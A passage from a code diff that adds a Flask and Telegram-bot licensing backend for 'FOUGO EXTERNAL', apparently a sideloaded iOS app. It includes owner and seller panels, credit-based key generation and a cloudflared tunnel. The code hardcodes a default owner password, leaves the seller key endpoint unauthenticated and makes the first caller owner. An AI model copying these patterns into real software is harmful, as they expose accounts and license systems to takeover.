+         <p style="margin:0 0 16px;color:#8B949E;font-size:13px;">Secure Backend Authentication (/owner) • <a href="/seller" style="color:#00F5D4;">Open Seller Panel (/seller)</a></p>
+         <input id="ou" placeholder="Owner Username" value="owner">
+         <input id="op" type="password" placeholder="Owner Password">
+         <button onclick="doLogin()">OWNER LOGIN</button>
+         <p id="lmsg" style="color:#FF4D6D;font-size:12px;"></p>
+        </div>
+        <div id="dashBox" style="display:none;">
+         <div class="card">
+         <h3 style="margin:0;color:#00F5D4;">📊 Live Owner Telemetry (Synced with iOS IPA & Telegram Bots)</h3>
+         <div class="grid">
+          <div class="stat">Total Licenses<b>{len(st['licenses_map'])}</b></div>
+          <div class="stat">Active Keys<b>{sum(1 for x in st['licenses_map'].values() if x['status']=='Active')}</b></div>
+          <div class="stat">Active Sellers<b>{len(sellers_rows)}</b></div>
+          <div class="stat">Maintenance<b id="maintStat">{get_setting('maintenance_mode')}</b></div>
+         </div>
+         <div style="margin-top:14px;">
+          <input id="gDays" type="number" value="30" placeholder="Days" style="width:90px;">
+          <input id="gQty" type="number" value="1" placeholder="Qty" style="width:80px;">
+          <input id="gDev" type="number" value="1" placeholder="Max Dev" style="width:90px;">
+          <button onclick="ownerAct('gen_keys',{{days:document.getElementById('gDays').value,qty:document.getElementById('gQty').value,max_devices:document.getElementById('gDev').value}})">➕ Generate License Key(s)</button>
+          <button onclick="ownerAct('toggle_maint',{{}})" style="background:#FFBE0B;">🛠 Toggle Maintenance</button>
+         </div>
+         <pre id="genOut" style="color:#00F5D4;font-size:12px;margin-top:8px;"></pre>
+         </div>
+         <div class="card">
+         <h3 style="margin:0 0 10px;color:#00F5D4;">💼 Seller & Reseller Credit Management</h3>
+         <div>
+          <input id="sId" placeholder="Seller Telegram ID">
+          <input id="sCr" type="number" value="50" placeholder="Credits" style="width:110px;">
+          <button onclick="ownerAct('add_seller',{{seller_id:document.getElementById('sId').value,credits:document.getElementById('sCr').value}})">➕ Add Seller</button>
+          <button onclick="ownerAct('add_credits',{{seller_id:document.getElementById('sId').value,credits:document.getElementById('sCr').value}})">💳 Top-Up Credits</button>
+         </div>
+         <table><tr><th>Seller Telegram ID</th><th>Username</th><th>Credits</th><th>Keys Sold</th><th>Status</th></tr>
+         {seller_rows_html}
+         </table>
+         </div>
+         <div class="card">
+         <h3 style="margin:0 0 10px;">🔑 License Keys (Synced to iOS IPA Status Screen)</h3>
+         <table><tr><th>License Key</th><th>Status</th><th>Plan</th><th>Expires</th><th>Device Limit</th><th>Device/Session</th><th>Action</th></tr>
+         {key_rows_html}
+         </table>
+         </div>
+        </div>
+        <script>
+        async function doLogin(){{
+         const r = await fetch('/owner',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{username:document.getElementById('ou').value,password:document.getElementById('op').value}})}});
+         const j = await r.json();
+         if(j.ok){{ document.getElementById('loginBox').style.display='none'; document.getElementById('dashBox').style.display='block'; }}
+         else {{ document.getElementById('lmsg').innerText = j.error || 'Login failed'; }}
+        }}
+        async function ownerAct(action, payload){{
+         const r = await fetch('/api/owner/action',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(Object.assign({{action}},payload))}});
+         const j = await r.json();
+         if(j.keys) document.getElementById('genOut').innerText = 'Generated: ' + j.keys.join(', ');
+         else location.reload();
+        }}
+        function resetKeyBtn(btn){{ ownerAct('reset_hwid',{{key:btn.getAttribute('data-key')}}); }}
+        </script></body></html>"""
+          return html
+         ip = request.remote_addr or "local"
+         now_t = time.time()
+         attempts = [t for t in login_attempts.get(ip,[]) if now_t - t < 300]
+         if len(attempts) >= 5: return jsonify({"ok": False,"error":"RATE_LIMITED"}),429
+         data = request.get_json(silent=True) or {}
+         u = (data.get("username") or "").strip()
+         p = data.get("password") or ""
+         if u == get_setting("owner_username") and hash_pw(p) == get_setting("owner_password_hash"):
+          tok = secrets.token_hex(24)
+          set_setting("active_owner_token",tok)
+          log_event(u,"owner","login_success",f"IP={ip}")
+          return jsonify({"ok": True,"owner_token": tok})
+         attempts.append(now_t)
+         login_attempts[ip] = attempts
+         log_event(u,"owner","login_failed",f"IP={ip}")
+         return jsonify({"ok": False,"error":"INVALID_OWNER_CREDENTIALS"}),401
+        @app.route("/seller",methods=["POST","GET"])
+        def seller_panel_route():
+         if request.method == "GET":
+          st = cloud_dict()
+          sellers_rows = db_exec("SELECT * FROM sellers ORDER BY added_at DESC",fetch=True)
+          html = f"""<!DOCTYPE html>
+        <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+        <title>{st['branding']['website_name']} — Seller Panel</title>
+        <style>
+         body {{ background:#070A12; color:#E6EDF3; font-family:-apple-system,BlinkMacSystemFont,sans-serif; margin:0; padding:24px; }}
+         .card {{ max-width:960px; margin:0 auto 20px; background:rgba(16,22,36,0.92); border:1px solid rgba(168,85,247,0.35); border-radius:18px; padding:22px; box-shadow:0 0 30px rgba(168,85,247,0.1); }}
+         input,select,button {{ background:#0E1626; color:#fff; border:1px solid rgba(255,255,255,0.16); border-radius:10px; padding:10px 14px; font-size:13px; margin:4px; }}
+         button {{ background:linear-gradient(135deg,#A855F7,#6366F1); color:#fff; font-weight:700; border:none; cursor:pointer; }}
+         table {{ width:100%; border-collapse:collapse; margin-top:12px; font-size:12px; }}
+         th,td {{ text-align:left; padding:9px; border-bottom:1px solid rgba(255,255,255,0.07); }}
+         .badge {{ padding:3px 8px; border-radius:6px; background:rgba(168,85,247,0.2); color:#C084FC; font-weight:600; }}
+        </style></head><body>
+        <div class="card">
+         <h2 style="margin:0 0 6px;color:#C084FC;">💼 {st['branding']['website_name']} — SELLER / RESELLER PANEL</h2>
+         <p style="margin:0 0 14px;color:#8B949E;font-size:13px;">Enter your Seller Telegram ID to generate customer keys using Seller Credits (1d=1Cr, 7d=3Cr, 30d=7Cr, Lifetime=20Cr)</p>
+         <input id="sid" placeholder="Your Seller Telegram ID (or OWNER)">
+         <select id="sdays">
+          <option value="1">1 Day VIP (1 Credit)</option>
+          <option value="7">7 Days VIP (3 Credits)</option>
+          <option value="30" selected>30 Days VIP (7 Credits)</option>
+          <option value="3650">Lifetime VIP (20 Credits)</option>
+         </select>
+         <button onclick="sellerGen()">🔑 Generate Key</button>
+         <p id="smsg" style="color:#00F5D4;font-weight:700;font-size:13px;"></p>
+        </div>
+        <div class="card">
+         <h3 style="margin:0 0 10px;color:#C084FC;">💳 Registered Sellers & Credit Balances</h3>
+         <table><tr><th>Seller ID</th><th>Username</th><th>Available Credits</th><th>Keys Sold</th><th>Status</th></tr>
+         {''.join(f"<tr><td><code>{s['telegram_id']}</code></td><td>{s['username']}</td><td><span class='badge'>{s['credits']} Cr</span></td><td>{s['keys_sold']}</td><td>{s['status']}</td></tr>" for s in sellers_rows) or "<tr><td colspan='5'>Use /addseller in Owner Bot or /owner Panel to register sellers.</td></tr>"}
+         </table>
+        </div>
+        <script>
+        async function sellerGen(){{
+         const r = await fetch('/seller',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{seller_id:document.getElementById('sid').value,days:document.getElementById('sdays').value}})}});
+         const j = await r.json();
+         document.getElementById('smsg').innerText = j.ok ? ('✅ Generated Key: ' + j.key + ' (Remaining: ' + j.credits + ' Cr)') : ('⛔ ' + (j.error || 'Failed'));
+        }}
+        </script></body></html>"""
+          return html
+         data = request.get_json(silent=True) or {}
+         sid = str(data.get("seller_id") or "").strip()
+         days = int(data.get("days") or 30)
+         cost = SELLER_COSTS.get(days,7)
+         srows = db_exec("SELECT * FROM sellers WHERE telegram_id=?",(sid,),fetch=True)
+         if not srows and sid != str(owner_id):
+          return jsonify({"ok": False,"error":"Seller Telegram ID not found. Ask Owner to run /addseller."}),403
+         if sid != str(owner_id):
+          cr = int(srows[0]["credits"] or 0)
+          if cr < cost:
+           return jsonify({"ok": False,"error":f"Insufficient Credits ({cr} Cr available, {cost} Cr needed)"}),403
+          db_exec("UPDATE sellers SET credits = credits - ?, keys_sold = keys_sold + 1 WHERE telegram_id=?",(cost,sid))
+         keys,exp = mk_keys(sid,days,1,1,f"Seller-{sid}")
+         rem = 999999 if sid == str(owner_id) else get_seller_credits(sid)
+         return jsonify({"ok": True,"key": keys[0],"expires": exp,"credits": rem})
+        threading.Thread(target=lambda: app.run(host="0.0.0.0",port=5050,use_reloader=False),daemon=True).start()
+        def start_cloudflare_tunnel():
+         global live_tunnel_url
+         try:
+          proc = subprocess.Popen(
+           ["cloudflared","tunnel","--url","http://127.0.0.1:5050","--no-autoupdate"],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,)
+          for line in proc.stdout:
+           m = re.search(r"(https://[a-zA-Z0-9-]+\.trycloudflare\.com)",line)
+           if m and not live_tunnel_url:
+            live_tunnel_url = m.group(1).strip()
+            print(f"Live Backend Tunnel Active: {live_tunnel_url}")
+            for bt_tok in (DEFAULT_OWNER_BOT, DEFAULT_SELLER_BOT, DEFAULT_USER_BOT, valid_token):
+             if bt_tok:
+              tg_api("setMyShortDescription",{"short_description": f"FOUGO_API: {live_tunnel_url}"},tok_override=bt_tok)
+            sync_cloud()
+            if owner_id:
+             send_tg(
+              owner_id,f"🌐 *LIVE IPA BACKEND & ALL 3 BOTS ONLINE*\n"
+              f"• *Owner Bot:* `@modezternalios_bot`\n"
+              f"• *Seller Bot:* `@xnexuspaneladmin_bot`\n"
+              f"• *User Bot:* `@fougoexternal_bot`\n"
+              f"• *Owner Web Panel (`/owner`):*\n{live_tunnel_url}/owner\n"
+              f"• *Default Owner Login:* `owner` / `FougoOwner#2026`\n"
+              f"• *iOS IPA Live Validation:* Connected (`0ms` sync)",tok_override=DEFAULT_OWNER_BOT)
+         except Exception as ex:
+          print("Tunnel note:",ex)
+        threading.Thread(target=start_cloudflare_tunnel,daemon=True).start()
+        sync_cloud()
+        db_tbl("sellers (telegram_id TEXT PRIMARY KEY,username TEXT DEFAULT '',credits INTEGER DEFAULT 0,keys_sold INTEGER DEFAULT 0,status TEXT DEFAULT 'Active',added_at TEXT )")
+        ROLE_PERMS = {
+         "OWNER": {"manage_keys","manage_users","manage_features","manage_buttons","manage_channels","manage_settings","manage_theme","manage_announcements","view_logs","manage_admins","manage_sellers","maintenance"},
+         "ADMIN": {"manage_keys","manage_users","manage_features","manage_buttons","manage_channels","manage_theme","manage_announcements","view_logs","manage_sellers","maintenance"},
+         "SELLER": {"seller_keys","view_own_keys","reset_own_keys"},
+         "SUPPORT": {"manage_keys","manage_users","view_logs"},
+        }
+        SELLER_COSTS = {1: 1, 7: 3, 30: 7, 3650: 20}
+        def get_seller_credits(uid_s):
+         r = db_exec("SELECT credits FROM sellers WHERE telegram_id=?",(str(uid_s),),fetch=True)
+         return int(r[0]["credits"]) if r else 0
+        def get_user_role(uid):
+         uid_s = str(uid)
+         if owner_id and uid_s == str(owner_id): return "OWNER",ROLE_PERMS["OWNER"]
+         s_rows = db_exec("SELECT * FROM sellers WHERE telegram_id=? AND status='Active'",(uid_s,),fetch=True)
+         rows = db_exec("SELECT * FROM admins WHERE telegram_id=?",(uid_s,),fetch=True)
+         if not rows and s_rows:
+          return "SELLER",ROLE_PERMS["SELLER"]
+         if not rows:
+          all_adm = db_exec("SELECT * FROM admins",fetch=True)
+          if not all_adm and not owner_id:
+           db_exec("INSERT INTO admins (telegram_id,role,permissions,added_at) VALUES (?,'OWNER','all',?)",(uid_s,now_iso()))
+           return "OWNER",ROLE_PERMS["OWNER"]
+          return None,set()
+         role = rows[0]["role"].upper()
+         perms_raw = rows[0]["permissions"]
+         if perms_raw == "all" or role == "OWNER": return role,ROLE_PERMS["OWNER"]
+         if role == "SELLER": return "SELLER",ROLE_PERMS["SELLER"]
+         custom = {p.strip() for p in perms_raw.split(",") if p.strip()}
+         return role,(custom or ROLE_PERMS.get(role,set()))
+        def menu_kb(role="OWNER"):
+         maint = get_setting("maintenance_mode","OFF")
+         if role == "SELLER":
+          return [
+           [{"text":"💼 Seller Wallet & Balance","callback_data":"seller_wallet"},{"text":"🔑 Generate Key (Credits)","callback_data":"seller_gen"}],
+           [{"text":"🗂 My Generated Keys","callback_data":"seller_keys"},{"text":"💳 Credit Pricing","callback_data":"seller_pricing"}],
+          ]
+         if role == "ADMIN":
+          return [
+           [{"text":"📊 Admin Dashboard","callback_data":"menu_stats"},{"text":"🔑 Create Keys","callback_data":"menu_genkey"}],
+           [{"text":"🗂 Manage Keys","callback_data":"menu_keys"},{"text":"👥 Users / Sessions","callback_data":"menu_sessions"}],
+           [{"text":"💼 Sellers & Credits","callback_data":"menu_sellers"},{"text": f"🛠 Maintenance: {maint}","callback_data":"toggle_maint"}],
+           [{"text":"📣 Announcements","callback_data":"menu_announce"},{"text":"📜 Activity Logs","callback_data":"menu_logs"}],
+          ]
+         return [
+          [{"text":"👑 Owner Stats","callback_data":"menu_stats"},{"text":"🔑 Create Keys","callback_data":"menu_genkey"}],
+          [{"text":"🗂 Manage Keys","callback_data":"menu_keys"},{"text":"👥 Users / Sessions","callback_data":"menu_sessions"}],
+          [{"text":"👮 Admin Panel / Roles","callback_data":"menu_admins"},{"text":"💼 Seller Panel / Credits","callback_data":"menu_sellers"}],
+          [{"text":"🎛 User Panel Features","callback_data":"menu_features"},{"text": f"🛠 Maintenance: {maint}","callback_data":"toggle_maint"}],
+          [{"text":"📣 Announcements","callback_data":"menu_announce"},{"text":"🔔 Send Notification","callback_data":"menu_notify"}],
+          [{"text":"📜 Activity Logs","callback_data":"menu_logs"},{"text":"⚙️ Owner Settings","callback_data":"menu_settings"}],
+         ]
+        def stats_txt(uid=None,role="OWNER"):
+         if role == "SELLER":
+          cr = get_seller_credits(uid)
+          s_row = db_exec("SELECT * FROM sellers WHERE telegram_id=?",(str(uid),),fetch=True)
+          sold = s_row[0]["keys_sold"] if s_row else 0
+          return (
+           "💼 *FOUGO EXTERNAL — SELLER PANEL*\n\n"
+           f"👤 *Seller ID:* `{uid}`\n"
+           f"💳 *Available Credits:* `{cr} Credits`\n"
+           f"🔑 *Total Keys Sold:* `{sold}`\n\n"
+           "*Key Credit Costs:*\n"
+           "• `1 Day Key` = `1 Credit`\n"
+           "• `7 Days Key` = `3 Credits`\n"
+           "• `30 Days Key` = `7 Credits`\n"
+           "• `Lifetime Key` = `20 Credits`\n\n"
+           "Commands: `/reset <KEY>` to reset customer HWID."
+          )
+         total_l = db_exec("SELECT COUNT(*) AS c FROM licenses",fetch=True)[0]["c"]
+         act_l = db_exec("SELECT COUNT(*) AS c FROM licenses WHERE status='Active'",fetch=True)[0]["c"]
+         exp_l = db_exec("SELECT COUNT(*) AS c FROM licenses WHERE status='Expired'",fetch=True)[0]["c"]
+         dis_l = db_exec("SELECT COUNT(*) AS c FROM licenses WHERE status IN ('Disabled','Suspended','Revoked')",fetch=True)[0]["c"]
+         total_s = db_exec("SELECT COUNT(*) AS c FROM sessions",fetch=True)[0]["c"]
+         act_s = db_exec("SELECT COUNT(*) AS c FROM sessions WHERE status='Active'",fetch=True)[0]["c"]
+         sellers_cnt = db_exec("SELECT COUNT(*) AS c FROM sellers",fetch=True)[0]["c"]
+         admins_cnt = db_exec("SELECT COUNT(*) AS c FROM admins",fetch=True)[0]["c"]
+         maint = get_setting("maintenance_mode","OFF")
+         panel_line = f"\n🌐 *Web Control Panel:* {live_tunnel_url}/owner" if live_tunnel_url else ""
+         return (
+          f"👑 *FOUGO EXTERNAL — {role} CONTROL PANEL*\n\n"
+          f"🔑 *Total Licenses:* `{total_l}` (`{act_l}` Active)\n"
+          f"⌛ *Expired:* `{exp_l}` | 🚫 *Suspended:* `{dis_l}`\n"
+          f"👥 *Active Device Sessions:* `{act_s} / {total_s}`\n"
+          f"👮 *Admins:* `{admins_cnt}` | 💼 *Sellers:* `{sellers_cnt}`\n"
+          f"🛠 *Maintenance Mode:* `{maint}`{panel_line}"
+         )
+        def mk_keys(actor,days,qty,max_dev=1,note="TG-Admin"):
+         created = []
+         exp = "Lifetime" if int(days) >= 3650 else (datetime.datetime.utcnow() + datetime.timedelta(days=int(days))).strftime("%Y-%m-%d %H:%M:%S UTC")
+         for _ in range(int(qty)):
+          k = f"FOUGO-{secrets.token_hex(2).upper()}-{secrets.token_hex(2).upper()}-{secrets.token_hex(2).upper()}"
+          db_exec(
+           "INSERT INTO licenses (key,status,duration_days,max_devices,note,created_at,expires_at) VALUES (?,'Active',?,?,?,?,?)",(k,int(days),int(max_dev),note,now_iso(),exp),)
+          created.append(k)
+         log_event(actor,"keys","create_batch",f"Qty={qty} Days={days} MaxDev={max_dev}")
+         sync_cloud()
+         return created,exp
+        import concurrent.futures
+        user_kb = [
+         [{"text":"🔑 Check License Key","callback_data":"user_check_help"},{"text":"🔄 Reset My HWID","callback_data":"user_reset_help"}],
+         [{"text":"📲 Download iOS IPA","callback_data":"user_ipa"},{"text":"🟢 Server Status","callback_data":"user_status"}],
+        ]
+        if owner_id:
+         send_tg(owner_id,stats_txt(owner_id,"OWNER"),menu_kb("OWNER"),tok_override=DEFAULT_OWNER_BOT)
+         send_tg(owner_id,stats_txt(owner_id,"SELLER"),menu_kb("SELLER"),tok_override=DEFAULT_SELLER_BOT)
+         send_tg(owner_id,"👤 *FOUGO EXTERNAL — USER LICENSE PORTAL*\n\nSend any `FOUGO-XXXX-XXXX-XXXX` key to inspect status, or use the buttons below:",user_kb,tok_override=DEFAULT_USER_BOT)
+        bot_pool = [
+         ("OWNER", DEFAULT_OWNER_BOT),
+         ("SELLER", DEFAULT_SELLER_BOT),
+         ("USER", DEFAULT_USER_BOT),
+        ]
+        offsets = {bt: 0 for _, bt in bot_pool}
+        def fetch_bot_updates(b_mode, b_tok):
+         try:
+          u_url = f"https://api.telegram.org/bot{b_tok}/getUpdates?timeout=15&offset={offsets.get(b_tok,0)}"
+          with urllib.request.urlopen(u_url,timeout=22) as resp:
+           res = json.loads(resp.read().decode("utf-8")).get("result",[])
+           if res:
+            offsets[b_tok] = res[-1]["update_id"] + 1
+           return [(b_mode, b_tok, item) for item in res]
+         except Exception:
+          return []
+        start_ts = time.time()
+        print("Starting 24/7 Multi-Bot Polling Loop (Owner Bot + Seller Bot + User Bot)...")
+        pool_exec = concurrent.futures.ThreadPoolExecutor(max_workers=3)
+        while (time.time() - start_ts) < 335 * 60:
+         try:
+          futs = [pool_exec.submit(fetch_bot_updates, bm, bt) for bm, bt in bot_pool]
+          updates = []
+          for f_item in concurrent.futures.as_completed(futs):
+           updates.extend(f_item.result() or [])
+          for b_mode, b_tok, u in updates:
+           _bot_ctx.token = b_tok
+           _bot_ctx.mode = b_mode
+           if "callback_query" in u:
+            cb = u["callback_query"]
+            cb_id = cb["id"]
+            uid = cb.get("from",{}).get("id")
+            cid = cb.get("message",{}).get("chat",{}).get("id")
+            data = cb.get("data","")
+            if data in ("user_ipa","user_status","user_check_help","user_reset_help"):
+             answer_cb(cb_id)
+             if data == "user_ipa":
+              send_tg(cid,f"📲 *FOUGO EXTERNAL — DIRECT ESIGN iOS IPA*\n\nDownload Link:\n{ipa_url}",user_kb)
+             elif data == "user_status":
+              maint = get_setting("maintenance_mode","OFF")
+              send_tg(cid,f"🟢 *FOUGO EXTERNAL CLOUD STATUS*\n• *Server:* `ONLINE (0ms Sync)`\n• *Maintenance Mode:* `{maint}`",user_kb)
+             elif data == "user_check_help":
+              send_tg(cid,"🔑 *CHECK LICENSE KEY*\nSend your key directly in chat (e.g. `FOUGO-XXXX-XXXX-XXXX`) or send:\n`/key FOUGO-XXXX-XXXX-XXXX`",user_kb)
+             elif data == "user_reset_help":
+              send_tg(cid,"🔄 *RESET DEVICE HWID*\nTo reset your bound iOS device, send:\n`/reset FOUGO-XXXX-XXXX-XXXX`",user_kb)
+             continue
+            role,perms = get_user_role(uid)
+            if not role:
+             answer_cb(cb_id,"⛔ Access Denied")
+             send_tg(cid,"⛔ *Access Denied*\nYou are not an authorized Fougo External Admin/Seller.")
+             continue
+            answer_cb(cb_id)
+            if data == "menu_main": send_tg(cid,stats_txt(uid,role),menu_kb(role))
+            elif data == "menu_stats": send_tg(cid,stats_txt(uid,role),menu_kb(role))
+            elif data == "seller_wallet": send_tg(cid,stats_txt(uid,"SELLER"),menu_kb("SELLER"))
+            elif data == "seller_pricing":
+             send_tg(cid,"💳 *SELLER KEY PRICING TABLE*\n• `1 Day Key` — `1 Credit`\n• `7 Days Key` — `3 Credits`\n• `30 Days Key` — `7 Credits`\n• `Lifetime Key` — `20 Credits`",menu_kb("SELLER"))
+            elif data == "seller_gen":
+             cr = get_seller_credits(uid)
+             skb = [
+              [{"text":"⚡ 1 Day (1 Cr)","callback_data":"sgen_1"},{"text":"⚡ 7 Days (3 Cr)","callback_data":"sgen_7"}],
+              [{"text":"🔥 30 Days (7 Cr)","callback_data":"sgen_30"},{"text":"👑 Lifetime (20 Cr)","callback_data":"sgen_3650"}],
+              [{"text":"⬅️ Back to Seller Panel","callback_data":"seller_wallet"}],
+             ]
+             send_tg(cid,f"🔑 *SELLER KEY GENERATOR*\n💳 *Your Balance:* `{cr} Credits`\nSelect a package below to generate key:",skb)
+            elif data.startswith("sgen_"):
+             d_val = int(data.split("_")[1])
+             cost = SELLER_COSTS.get(d_val, 7)
+             cr = get_seller_credits(uid)
+             if role != "OWNER" and cr < cost:
+              send_tg(cid,f"⛔ *Insufficient Credits!*\nRequired: `{cost} Credits` | Available: `{cr} Credits`\nContact Owner/Admin to top up your Seller balance.",menu_kb("SELLER"))
+              continue
+             if role != "OWNER":
+              db_exec("UPDATE sellers SET credits = credits - ?, keys_sold = keys_sold + 1 WHERE telegram_id=?",(cost,str(uid)))
+             keys,exp = mk_keys(uid,d_val,1,1,f"Seller-{uid}")
+             new_cr = get_seller_credits(uid)
+             send_tg(cid,f"✅ *Seller Key Generated!*\n🔑 *Key:* `{keys[0]}`\n⏳ *Duration:* `{d_val} Days` (`{exp}`)\n💳 *Remaining Credits:* `{new_cr} Credits`",menu_kb(role))
+            elif data == "seller_keys":
+             srows = db_exec("SELECT * FROM licenses WHERE note LIKE ? ORDER BY id DESC LIMIT 15",(f"%Seller-{uid}%",),fetch=True)
+             lines = [f"• `{r['key']}` — *{r['status']}* ({r['duration_days']}d)" for r in srows] or ["No keys generated by your Seller account yet."]
+             send_tg(cid,"🗂 *MY SELLER KEYS (Last 15)*\n" + "\n".join(lines) + "\n\nUse `/reset <KEY>` to reset customer HWID.",menu_kb(role))
+            elif data == "menu_sellers":
+             if "manage_sellers" not in perms and role != "OWNER":
+              send_tg(cid,"⛔ Permission `manage_sellers` required.")
+              continue
+             srows = db_exec("SELECT * FROM sellers ORDER BY added_at DESC",fetch=True)
+             lines = [f"• ID: `{s['telegram_id']}` | Credits: `{s['credits']} Cr` | Sold: `{s['keys_sold']}` | *{s['status']}*" for s in srows] or ["No Sellers added yet."]
+             send_tg(cid,"💼 *SELLER / RESELLER PANEL MANAGEMENT*\n" + "\n".join(lines) + "\n\n*Commands:*\n• `/addseller <TG_ID> <CREDITS>` — Add Seller\n• `/addcredits <TG_ID> <CREDITS>` — Top-Up Credits\n• `/delseller <TG_ID>` — Remove Seller",menu_kb(role))
+            elif data == "menu_genkey":
+             if "manage_keys" not in perms:
+              send_tg(cid,"⛔ Permission `manage_keys` required.")
+              continue
+             kb = [
+              [{"text":"➕ 1 Key (30d)","callback_data":"gen_30_1"},{"text":"➕ 5 Keys (30d)","callback_data":"gen_30_5"},{"text":"➕ 10 Keys (30d)","callback_data":"gen_30_10"}],[{"text":"➕ 25 Keys (30d)","callback_data":"gen_30_25"},{"text":"➕ 50 Keys (30d)","callback_data":"gen_30_50"},{"text":"➕ 100 Keys (30d)","callback_data":"gen_30_100"}],[{"text":"⚡ 1 Key (7d)","callback_data":"gen_7_1"},{"text":"👑 1 Key (Lifetime)","callback_data":"gen_3650_1"},{"text":"👑 10 Keys (Lifetime)","callback_data":"gen_3650_10"}],[{"text":"⬅️ Back to Owner Menu","callback_data":"menu_main"}],]
+             send_tg(cid,"🔑 *TELEGRAM KEY GENERATOR*\nSelect quantity & duration below,or send:\n`/genkey <days> <qty> <max_devices> [note]`\n_(Quantities supported: 1,5,10,25,50,100)_",kb)
+            elif data.startswith("gen_"):
+             _,d_str,q_str = data.split("_")
+             keys,exp = mk_keys(uid,int(d_str),int(q_str),1,f"By-{role}")
+             preview = "\n".join(f"`{k}`" for k in keys[:30])
+             more = f"\n_...and {len(keys)-30} more keys_" if len(keys) > 30 else ""
+             send_tg(cid,f"✅ *Generated {len(keys)} License Key(s)*\n⏳ *Duration:* `{d_str} Days` (`{exp}`)\n📱 *Device Limit:* `1`\n\n{preview}{more}",menu_kb())
+            elif data == "menu_keys":
+             rows = db_exec("SELECT * FROM licenses ORDER BY id DESC LIMIT 15",fetch=True)
+             if not rows: send_tg(cid,"📋 No licenses found. Tap *Create Keys* to generate.",menu_kb())
+             else:
+              lines = [f"• `{r['key']}` — *{r['status']}* ({r['duration_days']}d | Dev:{r['max_devices']})" for r in rows]
+              send_tg(
+               cid,"🗂 *RECENT LICENSES (Last 15)*\n" + "\n".join(lines) + "\n\n"
+               "*Key Actions:*\n"
+               "• `/search <text>` — Search keys\n"
+               "• `/key <KEY>` — View full key info\n"
+               "• `/activate <KEY>` | `/suspend <KEY>` | `/unsuspend <KEY>`\n"
+               "• `/revoke <KEY>` | `/delkey <KEY>` | `/reset <KEY>`\n"
+               "• `/extend <KEY> <days>` | `/limit <KEY> <devices>`",menu_kb(),)
+            elif data == "menu_sessions":
+             rows = db_exec("SELECT * FROM sessions ORDER BY id DESC LIMIT 15",fetch=True)
+             if not rows: send_tg(cid,"👥 *ACTIVE USER SESSIONS*\nNo active device sessions yet.",menu_kb())
+             else:
+              lines = [f"• `{r['session_id']}` | Key: `{r['license_key']}` | *{r['status']}* | `{r['device_info'][:25]}`" for r in rows]
+              send_tg(cid,"👥 *AUTHENTICATED SESSIONS*\n" + "\n".join(lines) + "\n\nCommands:\n• `/reset <KEY>` — Reset session/device\n• `/killsession <SESSION_ID>` — Disable session",menu_kb())
+            elif data == "menu_features":
+             feats = db_exec("SELECT * FROM features ORDER BY display_order ASC",fetch=True)
+             kb = []
+             lines = []
+             for f in feats:
+              st = "🟢 ON" if f["enabled"] else "🔴 OFF"
+              vis = "👁 Show" if f["visible"] else "🙈 Hide"
+              lck = "🔒 Locked" if f["locked"] else "🔓 Unlocked"
+              lines.append(f"• *{f['title']}* (`{f['code']}`) — {st} | {vis} | {lck}")
+              kb.append([
+               {"text": f"{f['code']}: {st}","callback_data": f"ftog_en_{f['code']}"},{"text": f"{vis}","callback_data": f"ftog_vis_{f['code']}"},{"text": f"{lck}","callback_data": f"ftog_lck_{f['code']}"},])
+             kb.append([{"text":"⬅️ Back","callback_data":"menu_main"}])
+             send_tg(cid,"🎛 *USER PANEL FEATURE CONTROL*\nTap any button to toggle live:\n\n" + "\n".join(lines) + "\n\nCommands:\n• `/addfeature <CODE>|<Title>|<Desc>|<BtnText>`\n• `/delfeature <CODE>`",kb)
+            elif data.startswith("ftog_"):
+             _,mode,fcode = data.split("_",2)
+             col = {"en":"enabled","vis":"visible","lck":"locked"}[mode]
+             db_exec(f"UPDATE features SET {col} = CASE WHEN {col}=1 THEN 0 ELSE 1 END WHERE code=?",(fcode,))
+             log_event(uid,"features",f"toggle_{col}",f"Feature={fcode}")
+             send_tg(cid,f"✅ Updated `{fcode}` ({col}). Tap *User Panel Features* to view.",menu_kb())
+            elif data == "menu_channels":
+             chs = db_exec("SELECT * FROM channels ORDER BY display_order ASC",fetch=True)
+             lines = [f"• `{c['id']}`: *{c['title']}* ({'🟢' if c['enabled'] else '🔴'}) — `{c['url']}` [{c['button_text']}]" for c in chs]
+             send_tg(cid,"📢 *JOIN CHANNELS MANAGEMENT*\n" + "\n".join(lines) + "\n\nCommands:\n• `/addchannel <Title>|<URL>|<ButtonText>`\n• `/delchannel <ID>`\n• `/togglechannel <ID>`",menu_kb())
+            elif data == "menu_profiles":
+             profs = db_exec("SELECT * FROM profiles ORDER BY display_order ASC",fetch=True)
+             lines = [f"• *{p['display_name']}* (`v{p['version']}`) — *{p['status']}* {'⭐Default' if p['is_default'] else ''}\n  URL: `{p['download_url']}`" for p in profs]
+             send_tg(cid,"📲 *iOS CONFIGURATION PROFILES*\n" + "\n".join(lines) + "\n\nCommands:\n• `/addprofile <Name>|<Display>|<Ver>|<URL>|<BtnText>`\n• `/delprofile <Name>`",menu_kb())
+            elif data == "menu_themes":
+             presets = ["FOUGO EXTERNAL iOS Red","Midnight","Neon","Carbon","Premium Black"]
+             kb = [[{"text": f"🎨 {p}","callback_data": f"settheme_{p}"}] for p in presets]
+             kb.append([{"text":"⬅️ Back","callback_data":"menu_main"}])
+             cur_t = get_setting("theme_preset")
+             send_tg(cid,f"🎨 *THEME MANAGEMENT*\nCurrent Preset: `{cur_t}`\nSelect a theme preset below:",kb)
+            elif data.startswith("settheme_"):
+             tname = data.replace("settheme_","")
+             set_setting("theme_preset",tname)
+             log_event(uid,"theme","change_preset",tname)
+             send_tg(cid,f"🎨 Active Theme switched to *{tname}*!",menu_kb())
+            elif data == "toggle_maint":
+             cur_m = get_setting("maintenance_mode","OFF")
+             new_m = "OFF" if cur_m == "ON" else "ON"
+             set_setting("maintenance_mode",new_m)
+             log_event(uid,"maintenance",f"set_{new_m}","")
+             send_tg(cid,f"🛠 *MAINTENANCE MODE IS NOW: {new_m}*\nTitle: `{get_setting('maintenance_title')}`\nDesc: _{get_setting('maintenance_description')}_\n\nUse `/setmaint <Title>|<Description>|<ReturnTime>` to customize.",menu_kb())
+            elif data == "menu_announce":
+             anns = db_exec("SELECT * FROM announcements ORDER BY id DESC LIMIT 5",fetch=True)
